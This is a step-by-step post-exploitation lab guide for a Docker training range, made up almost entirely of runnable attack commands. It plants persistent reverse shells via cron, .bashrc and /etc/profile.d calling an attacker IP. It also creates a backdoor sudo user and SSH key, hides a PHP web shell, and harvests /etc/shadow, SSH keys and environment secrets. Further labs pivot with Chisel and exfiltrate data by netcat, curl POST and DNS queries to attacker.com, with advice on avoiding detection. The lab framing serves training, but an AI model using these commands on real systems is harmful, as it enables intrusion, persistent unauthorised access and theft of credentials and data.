# Post-Exploitation Walkthrough

Step-by-step guide for maintaining access and moving through compromised networks.

---

## Lab 1: Situational Awareness

**Target:** CyberLab Docker containers
**Goal:** Gather intelligence after initial compromise

### Step 1: Initial Reconnaissance

```bash
# Connect to container
docker exec -it lab-dvwa bash

# Basic identity
whoami
id
hostname
```

### Step 2: System Information

```bash
# Operating system details
cat /etc/*release*
uname -a

# Check for virtualization/container
cat /proc/1/cgroup
ls -la /.dockerenv
```

### Step 3: Network Discovery

```bash
# Network configuration
ip addr
ip route
cat /etc/resolv.conf
cat /etc/hosts

# Active connections
ss -tulpn
netstat -an 2>/dev/null
```

### Step 4: User Enumeration

```bash
# Current user details
id
groups
sudo -l 2>/dev/null

# Other users
cat /etc/passwd | grep -v nologin
ls -la /home/

# Recent logins
w
who
last -a 2>/dev/null | head -10
```

### Step 5: Process and Service Analysis

```bash
# Running processes
ps aux

# Services listening
ss -tulpn

# Scheduled tasks
crontab -l 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.d/
```

### Step 6: File System Exploration

```bash
# Web files (common credential locations)
ls -la /var/www/html/
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null

# Interesting files
find / -name "*.conf" -type f 2>/dev/null | head -20
find / -name "*password*" -type f 2>/dev/null | head -20
```

### Step 7: Network Neighbors

```bash
# ARP table
arp -a 2>/dev/null || ip neigh

# Scan local network (simple)
for i in $(seq 1 20); do
    ping -c 1 -W 1 172.20.1.$i 2>/dev/null && echo "172.20.1.$i is up"
done
```

---

## Lab 2: Establishing Persistence

**Target:** Compromised Linux container
**Goal:** Maintain access across reboots/logouts

### Step 1: SSH Key Persistence

```bash
# On attacker machine, generate key pair
ssh-keygen -t rsa -b 4096 -f backdoor_key -N ""

# Copy public key
cat backdoor_key.pub
# Output: ssh-rsa AAAA... comment

# On target, add to authorized_keys
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-rsa AAAA... your_key" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Test from attacker
ssh -i backdoor_key root@target
```

### Step 2: Cron Job Persistence

```bash
# Method 1: User crontab
crontab -e
# Add line:
# */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Method 2: One-liner
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/172.20.0.1/4444 0>&1") | crontab -

# Verify
crontab -l
```

### Step 3: Backdoor User

```bash
# Create hidden user
useradd -m -s /bin/bash -G sudo -u 1001 sysadmin
echo "sysadmin:SuperSecret123!" | chpasswd

# Or modify existing user
usermod -aG sudo www-data

# Verify
grep sysadmin /etc/passwd
su - sysadmin
```

### Step 4: Bashrc Persistence

```bash
# Add to user's bashrc (runs on login)
echo 'nohup bash -i >& /dev/tcp/172.20.0.1/4444 0>&1 &' >> ~/.bashrc

# Add to system profile (all users)
echo 'nohup bash -i >& /dev/tcp/172.20.0.1/4444 0>&1 &' >> /etc/profile.d/update.sh
chmod +x /etc/profile.d/update.sh
```

### Step 5: Web Shell Persistence

```bash
# Create hidden web shell
cat << 'EOF' > /var/www/html/.system.php
<?php if(isset($_GET['c'])){echo "<pre>".shell_exec($_GET['c'])."</pre>";}?>
EOF

# Test
curl "http://localhost/.system.php?c=id"

# Make it blend in
mv /var/www/html/.system.php /var/www/html/includes/system_check.php
```

### Step 6: Verify Persistence

```bash
# Start listener on attacker
nc -lvnp 4444

# Wait for cron job (if configured)
# Or trigger bashrc by logging in
# Or test web shell

# Verify access works
id
whoami
```

---

## Lab 3: Credential Harvesting

**Target:** Compromised containers
**Goal:** Extract credentials for further access

### Step 1: Shadow File (Linux)

```bash
# If root access
cat /etc/shadow

# Extract hash
grep root /etc/shadow
# root:$6$rounds=5000$salt$hash:...

# Save for offline cracking
cat /etc/shadow > /tmp/shadow_dump.txt
```

### Step 2: Configuration Files

```bash
# Web application configs
find /var/www -name "*.php" -exec grep -l "password\|passwd\|pwd" {} \; 2>/dev/null

# Common locations
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/includes/config.php 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null

# Database connection strings
grep -r "mysql\|postgres\|mongo" /var/www/ 2>/dev/null | grep -i "password\|pass"
```

### Step 3: Environment Variables

```bash
# Current environment
env | grep -i "pass\|key\|secret\|token"

# All processes' environment
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
    cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|key"
done
```

### Step 4: History Files

```bash
# Bash history
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null

# Look for credentials in history
grep -i "password\|pass=\|mysql\|ssh" ~/.bash_history
```

### Step 5: SSH Keys

```bash
# Find SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null

# Check user directories
ls -la /home/*/.ssh/ 2>/dev/null
ls -la /root/.ssh/ 2>/dev/null

# Copy private keys
cat /home/user/.ssh/id_rsa
```

### Step 6: Database Credentials

```bash
# DVWA database config
docker exec lab-dvwa cat /var/www/html/config/config.inc.php

# MySQL connection test
mysql -u dvwa -p'p@ssw0rd' -e "SHOW DATABASES;"

# Dump user tables
mysql -u dvwa -p'p@ssw0rd' dvwa -e "SELECT * FROM users;"
```

---

## Lab 4: Lateral Movement in Docker Network

**Target:** CyberLab container network (172.20.0.0/16)
**Goal:** Move between containers

### Step 1: Map the Network

```bash
# From compromised container
docker exec -it lab-dvwa bash

# Check our IP
ip addr
# 172.20.1.10

# Quick ping sweep
for i in $(seq 1 254); do
    ping -c 1 -W 1 172.20.1.$i 2>/dev/null | grep "64 bytes" &
done
wait

# Or install nmap
apt update && apt install -y nmap
nmap -sn 172.20.1.0/24
```

### Step 2: Service Discovery

```bash
# Scan found hosts
nmap -sV 172.20.1.11  # Juice Shop
nmap -sV 172.20.1.12  # WebGoat
nmap -sV 172.20.2.10  # MySQL
```

### Step 3: Connect to Other Services

```bash
# Connect to vulnerable MySQL
mysql -h 172.20.2.10 -u root -p'root'

# Connect to Redis (no auth)
redis-cli -h 172.20.2.12
KEYS *

# Connect to MongoDB (no auth)
mongo --host 172.20.2.13
show dbs
```

### Step 4: SSH Pivoting (Concept)

```bash
# If SSH access to pivot host:
ssh -L 8080:172.20.1.11:3000 user@pivot_host

# Access Juice Shop through tunnel
curl http://localhost:8080
```

### Step 5: Using Credentials

```bash
# Try harvested credentials on other hosts
ssh labuser@172.20.4.10  # Vulnerable SSH
# Password: labpass123

# Or use SSH key if obtained
ssh -i stolen_key user@172.20.x.x
```

---

## Lab 5: Pivoting with Chisel

**Target:** Internal network through compromised host
**Goal:** Set up SOCKS proxy for internal access

### Step 1: Set Up Chisel Server (Attacker)

```bash
# Download chisel
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel

# Start server
./chisel server -p 8080 --reverse
```

### Step 2: Deploy Chisel Client (Pivot Host)

```bash
# Transfer chisel to compromised host
# On attacker:
python3 -m http.server 8000

# On pivot:
wget http://ATTACKER_IP:8000/chisel
chmod +x chisel

# Connect back to server
./chisel client ATTACKER_IP:8080 R:9050:socks
```

### Step 3: Use SOCKS Proxy

```bash
# Configure proxychains
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf

# Scan internal network through proxy
proxychains nmap -sT 172.20.2.0/24

# Access internal services
proxychains curl http://172.20.2.10:3306
```

---

## Lab 6: Data Exfiltration

**Target:** Sensitive data from compromised host
**Goal:** Extract data without detection

### Step 1: Identify Valuable Data

```bash
# Find sensitive files
find / -name "*.db" -o -name "*.sql" -o -name "*.conf" 2>/dev/null
find / -name "*password*" -o -name "*secret*" -o -name "*credential*" 2>/dev/null

# Database dumps
mysqldump -u root -p database > dump.sql
```

### Step 2: Simple HTTP Exfiltration

```bash
# On attacker, start listener
nc -lvnp 8888 > received_data.txt

# On target, send file
cat /etc/passwd | nc ATTACKER_IP 8888

# Or use curl
curl -X POST -d "$(cat /etc/shadow | base64)" http://ATTACKER_IP:8888/upload
```

### Step 3: Base64 Encoded Transfer

```bash
# Encode file on target
base64 /etc/shadow > /tmp/encoded.txt

# Display for copy-paste
cat /tmp/encoded.txt

# On attacker, decode
echo "BASE64_STRING" | base64 -d > shadow.txt
```

### Step 4: Archive and Transfer

```bash
# Create archive
tar czf /tmp/data.tar.gz /etc/shadow /etc/passwd /var/www/html/config*

# Transfer via netcat
# Attacker: nc -lvnp 4444 > data.tar.gz
# Target: nc ATTACKER_IP 4444 < /tmp/data.tar.gz

# Extract
tar xzf data.tar.gz
```

### Step 5: DNS Exfiltration (Advanced)

```bash
# Encode data in DNS queries
data=$(cat /etc/passwd | base64 | tr -d '\n')
for chunk in $(echo $data | fold -w 30); do
    nslookup $chunk.attacker.com
done

# On attacker, monitor DNS queries
sudo tcpdump -i eth0 port 53
```

---

## Practice Exercise: Full Post-Exploitation Chain

```bash
# Starting from compromised DVWA container:

# 1. Situational awareness
docker exec -it lab-dvwa bash
whoami && id
ip addr
ps aux

# 2. Establish persistence
echo 'bash -i >& /dev/tcp/172.20.0.1/4444 0>&1 &' >> ~/.bashrc

# 3. Harvest credentials
cat /var/www/html/config/config.inc.php
cat /etc/shadow

# 4. Discover network
for i in 1 2 3; do
    for j in 10 11 12 13 14; do
        ping -c 1 172.20.$i.$j 2>/dev/null | grep "64 bytes" && echo "172.20.$i.$j up"
    done
done

# 5. Move laterally
mysql -h 172.20.2.10 -u root -p'root' -e "SELECT * FROM mysql.user;"

# 6. Exfiltrate data
cat /etc/shadow | base64 > /tmp/exfil.txt
# Transfer to attacker
```

---

## Key Takeaways

1. **Always enumerate before acting** - Understand the environment
2. **Multiple persistence methods** - Don't rely on just one
3. **Credentials are gold** - Search everywhere for them
4. **Network awareness** - Know what else is accessible
5. **Stealth matters** - In real engagements, avoid detection
6. **Document everything** - Keep track of access and findings

---

**Next:** [Hints](./hints.md) | **Back to:** [Module Overview](../README.md)
